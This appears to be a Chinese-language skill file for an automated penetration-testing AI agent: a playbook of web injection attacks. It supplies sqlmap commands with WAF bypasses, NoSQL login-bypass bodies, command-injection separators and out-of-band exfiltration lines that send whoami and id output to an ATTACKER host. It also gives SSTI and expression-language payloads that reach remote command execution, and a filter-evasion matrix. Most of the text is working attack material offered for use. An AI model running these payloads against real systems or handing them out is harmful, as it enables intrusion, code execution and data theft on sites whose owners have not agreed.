---
name: web-injection-playbook
description: Web 注入面全谱打法（SQLi / NoSQL / 命令注入 / SSTI / LDAP-XPath / 表达式注入）。当意图涉及"参数注入""报错回显""绕过过滤""构造 payload""盲注带外"时读本 skill。
---
# Web 注入面 Playbook

> 用法：先按「指纹 → 定位注入点 → 分层试探 → 带外兜底 → 证据固化」走。
> 所有命令在容器内执行，前缀 `kx`（见 kali-toolbox skill）；HTTP 类请求可直接 curl。

## 0. 先做三件事（30 秒内）

```bash
# ① 指纹：技术栈决定后面走哪条分支
kx whatweb -a 3 http://TARGET/
curl -si http://TARGET/ | head -30          # Server / X-Powered-By / Set-Cookie 名

# ② 收集所有参数入口（GET/POST/JSON/Header/Cookie/路径段）
#    把每个参数名 + 类型记进 insert_assets，别靠记忆

# ③ 基线：正常请求、异常请求、超长请求各一次，记下差异
```

## 1. SQL 注入

**判定优先级**：报错回显 > 布尔差异 > 时间盲 > 带外。

```bash
# 自动化先跑一遍（省时间，别手搓）
kx sqlmap -u "http://TARGET/item?id=1" --batch --level=3 --risk=2 --dbs
kx sqlmap -u "http://TARGET/item?id=1" --batch --technique=BEUST --dbms=mysql --current-db

# POST / JSON / Cookie 注入点
kx sqlmap -u "http://TARGET/api/login" --data='{"u":"a","p":"b"}' --batch --level=3
kx sqlmap -r req.txt --batch --level=5 --risk=2     # 从文件读原始请求最省事

# WAF 在位时
kx sqlmap -u "URL" --batch --tamper=space2comment,between,randomcase --random-agent --delay=1
```

手测时的高价值探测串（先判断是否进入 SQL，再谈利用）：

| 目的 | payload |
|---|---|
| 引号逃逸报错 | `'` `"` `\` `` ` `` `')` `"))` |
| 算术/布尔 | `1' AND '1'='1` vs `1' AND '1'='2`；`1 AND 1=1` vs `1 AND 1=2` |
| 数字型免引号 | `1 AND SLEEP(3)` |
| 时间盲（各库） | MySQL `SLEEP(3)` / PG `pg_sleep(3)` / MSSQL `WAITFOR DELAY '0:0:3'` / Oracle `dbms_pipe.receive_message('a',3)` |
| 栈叠 | `; SELECT 1--`（MSSQL/PG 常见，MySQL 需 multi-statement） |
| 二阶 | 把 payload 存进资料/昵称/文件名，另一处渲染时触发 |

**判定标准**：同一请求连发 3 次，时间差稳定 ≥ 预设值才算时间盲成立（网络抖动会骗你）。**只凭报错关键字不算已注入**，要拿到可复现证据（库名/表名/数据行）。

## 2. NoSQL 注入

```bash
# MongoDB 认证绕过（JSON body）
{"user":"admin","pass":{"$ne":null}}
{"user":{"$gt":""},"pass":{"$gt":""}}
{"user":"admin","pass":{"$regex":"^a"}}     # 逐字符盲取

# URL 编码形式（PHP 风格数组）
user[$ne]=1&pass[$ne]=1
user[$regex]=^adm&pass[$gt]=
```
判定：状态码/响应体从"失败"变"成功"，或响应时间随 `$where: sleep()` 变化。

## 3. 命令注入

```bash
# 分隔符全试一遍（不是只有 ; 和 |）
;  |  ||  &  &&  %0a  `cmd`  $(cmd)  %00

# 无回显 → 带外（先起监听）
# 容器内：kx nc -lvnp 4444
TARGET; curl http://ATTACKER/$(whoami)
TARGET; nslookup $(whoami).ATTACKER     # DNS 带外，最不容易被拦
TARGET; ping -c1 -p $(id|base64 -w0) ATTACKER

# 盲注逐字符（无回显、无带外时）
TARGET; sleep 3
TARGET; [ $(whoami|cut -c1) = r ] && sleep 3
```
**参数注入 / 参数走私**：`--foo=bar`、`-o /tmp/x`、`--config=/dev/null`、`%00` 截断、超长参数、重复参数（后端取第一个 vs 最后一个）。

## 4. SSTI（服务端模板注入）

| 引擎 | 探测 | RCE 方向 |
|---|---|---|
| Jinja2/Twig | `{{7*7}}` → `49`；`{{7*'7'}}` → 区分 Jinja2(7777777)/Twig(49) | `{{cycler.__init__.__globals__.os.popen('id').read()}}` |
| Freemarker | `${7*7}` | `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` |
| Velocity | `#set($x=7*7)$x` | `$class.inspect("java.lang.Runtime")...` |
| Thymeleaf | `[[${7*7}]]` | `__${T(java.lang.Runtime).getRuntime().exec('id')}__::x` |
| Smarty | `{$smarty.version}` | `{php}...{/php}`（旧版）/ `{system('id')}` |
| ERB/EJS | `<%= 7*7 %>` | `<%= system('id') %>` |

**SSTI 三步法**：① 算术探测引擎 → ② 对象/内省探测（`{{self}}`、`{{config}}`、`__class__`、`__mro__`）→ ③ 落到命令执行并取回显。

## 5. 表达式语言注入（EL / SpEL / OGNL / MVEL）

```
${7*7}        ${"".getClass()}     T(java.lang.Runtime).getRuntime().exec("id")
%{7*7}        #{7*7}               @java.lang.Runtime@getRuntime().exec("id")
```
出现在：表单校验回显、日志格式化、报表/规则引擎、Spring 参数绑定、Struts 参数名。

## 6. 带外通道（无回显时的通用兜底）

```bash
# 容器内起 HTTP/DNS 监听
kx nc -lvnp 8000
kx tcpdump -ni any port 53 or port 8000

# 让目标帮你取数据
curl   "http://TARGET/?q=1;curl http://ATTACKER/$(id|base64 -w0)"
wget   "http://ATTACKER/$(hostname)"
dig    "data.ATTACKER"
```
**优先 DNS 带外**：出站 DNS 几乎从不被拦，HTTP 常被出站策略挡住。

## 7. 绕过矩阵（被过滤时按顺序换）

1. **编码**：URL / 双 URL / Unicode / HTML 实体 / base64 / 十六进制
2. **大小写与空白**：`SeLeCt`、`/**/`、`%09`、`%0b`、换行替代空格
3. **等价语法**：`AND`→`&&`、`=`→`LIKE`、`substring`→`mid`、`concat`→`||`
4. **语法拆解**：分块拼接、注释截断、`LIMIT` 分页逐段取
5. **协议层**：分块传输、HTTP/2 伪头、双重 `Content-Length`
6. **参数污染**：同名参数多份、数组化、`a[]=1&a=2`

## 8. 判定与写回（必做）

- **确认漏洞** → `report_finding`，evidence 放**真实请求 + 真实响应/回显**（不是"疑似"）。
- 试了但没打通 → `record_fact`，标 `inferred`，写清"试了哪些构造、卡在哪一步"。
- 严禁把"CVE 匹配""版本号对得上""报错里出现了 SQL 关键字"当成已确认注入。
